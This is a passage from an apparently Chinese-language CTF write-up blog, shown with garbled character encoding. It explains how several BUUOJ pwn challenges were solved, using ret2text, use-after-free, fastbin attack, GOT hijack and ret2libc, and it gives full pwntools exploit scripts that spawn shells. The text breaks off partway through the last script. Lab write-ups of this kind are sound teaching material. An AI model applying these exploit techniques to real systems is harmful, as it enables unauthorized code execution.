ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/01/e2jUYcNvISPsZqy.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/01/j2BrJifVY48SbTK.png" alt="image.png"></p><p>readè¯»å…¥æ—¶ä¼šæŠŠsignedè½¬æˆunsignedï¼Œ è¾“å…¥-1å³å¯ç»•è¿‡æ£€æµ‹</p><p>åŒæ—¶æˆ‘ä»¬å‘ç°å­˜åœ¨åé—¨å‡½æ•°ï¼Œè¿”å›è‡³æ­¤å³å¯</p><p><img src="https://i.loli.net/2020/12/01/MHwmRf2q1tEk9ro.png" alt="image.png"></p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 25058)</span></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>).encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/12/01/xLOq52VBcJ74bUm.png" alt="image.png"></p><h1 id="0x02A-hitcontraining-uaf-UAF-fastbin-double-free"><a href="#0x02A-hitcontraining-uaf-UAF-fastbin-double-free" class="headerlink" title="0x02A.hitcontraining_uaf - UAF + fastbin double free"></a>0x02A.hitcontraining_uaf - UAF + fastbin double free</h1><p><del>æ¼æ´ç›´æ¥åœ¨é¢˜ç›®åç§°é‡Œè¯´æ˜äº†äº‹UAF</del></p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/03/xhMBIPmZ2V8RHyu.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªç¨‹åºæœ‰ç€<strong>åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</strong></p><p>ä¸éš¾çœ‹å‡ºåœ¨æ·»åŠ å †å—æ—¶é¦–å…ˆä¼šåˆ†é…ä¸€ä¸ª8å­—èŠ‚å¤§å°çš„chunkï¼Œè¯¥chunkå‰4å­—èŠ‚å‚¨å­˜ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå4å­—èŠ‚åˆ™å‚¨å­˜å®é™…åˆ†é…çš„chunkçš„æŒ‡é’ˆ</p><p><img src="https://i.loli.net/2020/12/03/6Fg3EXu5rqiH9wQ.png" alt="image.png"></p><p>åœ¨æ‰“å°å †å—æ—¶ä¼šè°ƒç”¨å°chunkä¸­çš„å‡½æ•°æŒ‡é’ˆæ¥æ‰“å°å †å—å†…å®¹</p><p><img src="https://i.loli.net/2020/12/03/m2nw4WfoP8cGgsS.png" alt="image.png"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨é‡Šæ”¾å †å—çš„è¿‡ç¨‹ä¸­å¹¶æœªå°†å †å—æŒ‡é’ˆç½®0ï¼Œ<strong>å­˜åœ¨UAFæ¼æ´</strong></p><p><img src="https://i.loli.net/2020/12/03/ZkwVJ34ifBMCytQ.png" alt="image.png"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨åé—¨å‡½æ•°</p><p><img src="C:\Users\SUR\AppData\Roaming\Typora\typora-user-images\1606984117052.png" alt="1606984117052"></p><p>æ•…è€ƒè™‘é€šè¿‡fastbin double freeåˆ†é…åˆ°åŒä¸€ä¸ªå †å—åæ”¹å†™å‡½æ•°æŒ‡é’ˆä¸ºåé—¨å‡½æ•°åœ°å€åæ‰“å°å³å¯getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./hacknote&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,28832)</span></span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Note size :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">8</span>, p32(backdoor)) <span class="comment"># idx 2, overlapping</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/12/03/yKXTYzOgBD4HIPW.png" alt="image.png"></p><h1 id="0x02B-ZJCTF-2019-EasyHeap-fastbin-attack"><a href="#0x02B-ZJCTF-2019-EasyHeap-fastbin-attack" class="headerlink" title="0x02B.[ZJCTF 2019]EasyHeap - fastbin attack"></a>0x02B.[ZJCTF 2019]EasyHeap - fastbin attack</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p><p><img src="https://i.loli.net/2020/12/03/xyaWKuVEgNkX7rs.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°è¯¥ç¨‹åºå­˜åœ¨åˆ†é…ã€ç¼–è¾‘ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p><p>æ¼æ´ç‚¹åœ¨äºç¼–è¾‘å †å—çš„åœ°æ–¹ï¼Œå¯ä»¥è¾“å…¥ä»»æ„é•¿åº¦å†…å®¹é€ æˆå †æº¢å‡º</p><p><img src="https://i.loli.net/2020/12/03/wRoqFJ6Z5VXpLeM.png" alt="image.png"></p><p>åˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥ä¿®æ”¹fastbinä¸­çš„fdåˆ†é…fake chunkæ¥è¿›è¡Œä»»æ„åœ°å€å†™</p><p>åœ¨bssæ®µé™„è¿‘æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªsizeåˆé€‚çš„åœ°æ–¹</p><p><img src="https://i.loli.net/2020/12/03/SjcMlvYBCKwhfp6.png" alt="image.png"></p><p>ç”±äºpltè¡¨ä¸­å°±æœ‰systemå‡½æ•°ï¼Œæ•…è€ƒè™‘åˆ†é…ä¸€ä¸ªbssæ®µä¸Šçš„fake chunkåä¿®æ”¹ä»»ä¸€å †å—æŒ‡é’ˆä¸º<code>free@got</code>åä¿®æ”¹<code>free@got</code>ä¸º<code>system@plt</code>åfreeæ‰ä¸€ä¸ªå†…å®¹ä¸º<code>&quot;/bin/sh\x00&quot;</code>çš„chunkå³å¯get shell</p><p><img src="https://i.loli.net/2020/12/03/w2WaI8uy7Sb1hsz.png" alt="image.png"></p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26930</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content of heap : &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020a0</span> - <span class="number">3</span> + <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">114514</span>, payload)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 5, fake chunk on the bss</span></span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b&#x27;\xaa&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x100</span>, payload2)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x10</span>, p64(e.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/12/03/R5qOZ8lECUYPbN6.png" alt="image.png"></p><blockquote><p>å…¶å®æœ‰ä¸€ä¸ªcat flagçš„åé—¨å‡½æ•°ï¼Œä¸è¿‡pwnçš„æœ€ç»ˆç›®çš„è‡ªç„¶æ˜¯getshellï¼Œ<del>æ‰€ä»¥è¿™ä¸ªåé—¨å‡½æ•°å¯¹ğŸ‘´æ¥è¯´ä¸å­˜åœ¨çš„</del></p></blockquote><h1 id="0x02C-babyfengshui-33c3-2016-got-table-hijack"><a href="#0x02C-babyfengshui-33c3-2016-got-table-hijack" class="headerlink" title="0x02C.babyfengshui_33c3_2016 - got table hijack"></a>0x02C.babyfengshui_33c3_2016 - got table hijack</h1><p><del>å †é¢˜é›†ä¸­åœ°å¸¦è¯·å°å¿ƒ</del></p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¼€äº†NXå’Œcanary</p><p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºåˆ†é…å †å—æ—¶æ‰€ç”Ÿæˆçš„å¤§è‡´ç»“æ„åº”å½“å¦‚ä¸‹ï¼Œä¸”<strong>è¯¥ç»“æ„ä½“mallocçš„å¤§å°ä¸º0x80ï¼Œå¤„åœ¨unsorted bin èŒƒå›´å†…</strong></p><p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" alt="image.png"></p><p>æ¼æ´ç‚¹åœ¨äºå¯¹è¾“å…¥é•¿åº¦çš„æ£€æµ‹ï¼Œå®ƒæ˜¯æ£€æµ‹çš„æ˜¯<strong>æˆ‘ä»¬æ‰€è¾“å…¥çš„é•¿åº¦æ˜¯å¦å¤§äºä»description chunkçš„addråˆ°struct chunkçš„prev_sizeçš„é•¿åº¦</strong></p><p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" alt="image.png"></p><p>åœ¨å¸¸è§„æƒ…å†µä¸‹æˆ‘ä»¬ä¼¼ä¹åªèƒ½å¤Ÿè¦†å†™æ‰PREV_SIZEçš„ä¸€éƒ¨åˆ†ï¼Œä¸ç—›ä¸ç—’</p><p>ä½†æ˜¯è€ƒè™‘è¿™æ ·çš„ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬å…ˆåˆ†é…ä¸¤ä¸ªå¤§å—ï¼ˆchunk<em>4ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå—çš„sizeè¦åœ¨unsortedèŒƒå›´å†…ï¼‰ï¼Œä¹‹åé‡Šæ”¾æ‰ç¬¬ä¸€ä¸ªå¤§å—ï¼Œå†åˆ†é…ä¸€ä¸ªsizeæ›´å¤§çš„å—ï¼Œunsorted binå†…å°±ä¼šä»è¿™ä¸ªå¤§chunkï¼ˆç”±ä¸¤ä¸ªchunkåˆå¹¶è€Œæ¥ï¼‰ä¸­åˆ‡å‰²ä¸€ä¸ªå¤§chunkç»™åˆ°descriptionï¼Œä¹‹åå†ä»ä¸‹æ–¹çš„top chunkåˆ‡å‰²0x90æ¥ç»™åˆ°structï¼Œè¿™ä¸ªæ—¶å€™*<em>ç”±äºå¯¹lengthçš„é”™è¯¯åˆ¤å®šå°±ä¼šå¯¼è‡´æˆ‘ä»¬æœ‰æœºä¼šè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„å†…å®¹</em></em></p><p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" alt="image.png"></p><p>æ•…è€ƒè™‘å…ˆè¦†å†™ç¬¬äºŒä¸ªå¤§å—ä¸­çš„description addrä¸ºfree@gotåæ³„æ¼å‡ºlibcçš„åŸºå€ï¼Œåå†ä¿®æ”¹free@gotä¸ºsystemå‡½æ•°åœ°å€åé‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º<code>&quot;/bin/sh&quot;</code>çš„chunkå³å¯é€šè¿‡<code>system(&quot;/bin/sh&quot;)</code>æ¥get shell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;,26486)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Action: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, name, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size of description: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;name: &quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, length:<span class="built_in">int</span>, descryption</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">&quot;arttnba3&quot;</span>, <span class="number">0x10</span>, <span class="string">&quot;/bin/sh\x00&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    big_size = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span></span><br><span class="line">    padding_length = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">    new(big_size, <span class="string">&quot;arttnba3&quot;</span>, padding_length + <span class="number">4</span>, <span class="string">b&#x27;A&#x27;</span> * padding_length + p32(e.got[<span class="string">&#x27;free&#x27;</span>])) <span class="comment"># idx 3</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;description: &quot;</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" alt="image.png"></p><blockquote><p>ä»¥å‰åšå †éƒ½æ˜¯64ä½èµ·æ‰‹ï¼Œè¿™32ä½çš„å †é¢˜å±å®æŠŠæˆ‘å‘åˆ°äº†ï¼Œ<del>æˆ‘æ„£æ˜¯æ‹¿ç€64ä½çš„libcæ€¼äº†åŠå¤©ï¼Œä»¥åŠæ¯«ä¸æ€ç´¢å°±å†™çš„0x10çš„chunkå¤´</del></p><p>æœ¬é¢˜åŸé¢˜æ¥è‡ªäºC3CTFï¼Œæ­ªå›½äººçš„é¢˜ç›®è´¨é‡å…¶å®è¿˜æ˜¯å¯ä»¥çš„ï¼ˆå½“ç„¶ç°åœ¨æˆ‘ä¹Ÿå°±åªèƒ½å†™å¾—å‡ºç­¾åˆ°é¢˜233333</p></blockquote><h1 id="0x02D-picoctf-2018-rop-chain-ret2libc"><a href="#0x02D-picoctf-2018-rop-chain-ret2libc" class="headerlink" title="0x02D.picoctf_2018_rop chain - ret2libc"></a>0x02D.picoctf_2018_rop chain - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œ åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2020/12/04/4g6RJGxlf73ZTAB.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/12/04/fBGecSvgaFmsdCb.png" alt="image.png"></p><p>å¾ˆå¤§å¾ˆç›´æ¥çš„ä¸€ä¸ªæº¢å‡ºçš„æ¼æ´</p><p>ç”±äºæ²¡æœ‰èƒ½ç›´æ¥getshellçš„gadgetï¼Œè¿˜æ˜¯è€ƒè™‘ret2libcï¼šæ„é€ ropé“¾æ³„éœ²libcåŸºå€åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>) <span class="comment"># remote(&#x27;node3.buuoj.cn&#x27;, 28376)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span 